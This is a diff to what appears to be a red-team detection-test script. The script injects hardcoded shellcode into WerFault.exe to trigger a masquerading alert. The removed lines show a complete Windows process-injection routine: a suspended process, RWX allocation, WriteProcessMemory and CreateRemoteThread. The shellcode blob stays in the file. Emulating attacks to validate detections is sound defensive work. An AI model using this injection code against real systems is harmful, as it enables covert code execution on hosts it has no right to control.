@@ -16,19 +16,6 @@ from ctypes.wintypes import LPVOID
 from ctypes.wintypes import LPCVOID
 import win32process
 
-LPCSTR = LPCTSTR = ctypes.c_char_p
-LPDWORD = PDWORD = ctypes.POINTER(DWORD)
-
-
-class _SECURITY_ATTRIBUTES(ctypes.Structure):
-    _fields_ = [('nLength', DWORD),
-                ('lpSecurityDescriptor', LPVOID),
-                ('bInheritHandle', BOOL), ]
-
-
-SECURITY_ATTRIBUTES = _SECURITY_ATTRIBUTES
-LPSECURITY_ATTRIBUTES = ctypes.POINTER(_SECURITY_ATTRIBUTES)
-LPTHREAD_START_ROUTINE = LPVOID
 
 metadata = RtaMetadata(
     uuid="727aa289-a1ff-4c82-b688-4cc99e07269f",
@@ -45,39 +32,6 @@ metadata = RtaMetadata(
 
 
 @common.requires_os(metadata.platforms)
-def Inject(path, shellcode):
-    # created suspended process
-    info = win32process.CreateProcess(None, path, None, None, False, 0x04, None, None, win32process.STARTUPINFO())
-    page_rwx_value = 0x40
-    process_all = 0x1F0FFF
-    memcommit = 0x00001000
-    if info[0].handle > 0 :
-       print('[+] - Created ', path, 'Suspended')
-    shellcode_length = len(shellcode)
-    process_handle = info[0].handle  # phandle
-    VirtualAllocEx = windll.kernel32.VirtualAllocEx
-    VirtualAllocEx.restype = LPVOID
-    VirtualAllocEx.argtypes = (HANDLE, LPVOID, DWORD, DWORD, DWORD)
-
-    WriteProcessMemory = ctypes.windll.kernel32.WriteProcessMemory
-    WriteProcessMemory.restype = BOOL
-    WriteProcessMemory.argtypes = (HANDLE, LPVOID, LPCVOID, DWORD, DWORD)
-    CreateRemoteThread = ctypes.windll.kernel32.CreateRemoteThread
-    CreateRemoteThread.restype = HANDLE
-    CreateRemoteThread.argtypes = (HANDLE, LPSECURITY_ATTRIBUTES, DWORD, LPTHREAD_START_ROUTINE, LPVOID, DWORD, DWORD)
-
-    # allocate RWX memory
-    lpBuffer = VirtualAllocEx(process_handle, 0, shellcode_length, memcommit, page_rwx_value)
-    print('[+] - Allocated remote memory at ', hex(lpBuffer))
-
-    # write shellcode in allocated memory
-    res = WriteProcessMemory(process_handle, lpBuffer, shellcode, shellcode_length, 0)
-    if res > 0 :
-        print('[+] - Shellcode written.')
-
-    # create remote thread to start shellcode execution
-    CreateRemoteThread(process_handle, None, 0, lpBuffer, 0, 0, 0)
-    print('[+] - Shellcode Injection, done.')
 
 
 def main():
@@ -85,8 +39,8 @@ def main():
     shellcode = b"\x33\xC9\x64\x8B\x41\x30\x8B\x40\x0C\x8B\x70\x14\xAD\x96\xAD\x8B\x58\x10\x8B\x53\x3C\x03\xD3\x8B\x52\x78\x03\xD3\x8B\x72\x20\x03\xF3\x33\xC9\x41\xAD\x03\xC3\x81\x38\x47\x65\x74\x50\x75\xF4\x81\x78\x04\x72\x6F\x63\x41\x75\xEB\x81\x78\x08\x64\x64\x72\x65\x75\xE2\x8B\x72\x24\x03\xF3\x66\x8B\x0C\x4E\x49\x8B\x72\x1C\x03\xF3\x8B\x14\x8E\x03\xD3\x33\xC9\x53\x52\x51\x68\x61\x72\x79\x41\x68\x4C\x69\x62\x72\x68\x4C\x6F\x61\x64\x54\x53\xFF\xD2\x83\xC4\x0C\x59\x50\x51\x66\xB9\x6C\x6C\x51\x68\x33\x32\x2E\x64\x68\x77\x73\x32\x5F\x54\xFF\xD0\x83\xC4\x10\x8B\x54\x24\x04\x33\xC9\x51\xB9\x74\x6F\x6E\x61\x51\x83\x6C\x24\x03\x61\x68\x65\x42\x75\x74\x68\x4D\x6F\x75\x73\x68\x53\x77\x61\x70\x54\x50\xFF\xD2\x83\xC4\x14\x33\xC9\x41\x51\xFF\xD0\x83\xC4\x04\x5A\x5B\xB9\x65\x73\x73\x61\x51\x83\x6C\x24\x03\x61\x68\x50\x72\x6F\x63\x68\x45\x78\x69\x74\x54\x53\xFF\xD2\x33\xC9\x51\xFF\xD0\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90\90"
 
     # Inject shellcode into WerFault.exe to trigger <Potential Masquerading as Windows Error Manager>
-    Inject(u"C:\\Windows\\SysWOw64\\WerFault.exe", shellcode)
-    time.sleep(2)
+    common.Inject(u"C:\\Windows\\SysWOw64\\WerFault.exe", shellcode)
+    #time.sleep(2)
     common.execute(["taskkill", "/f", "/im", "WerFault.exe"])
 
 
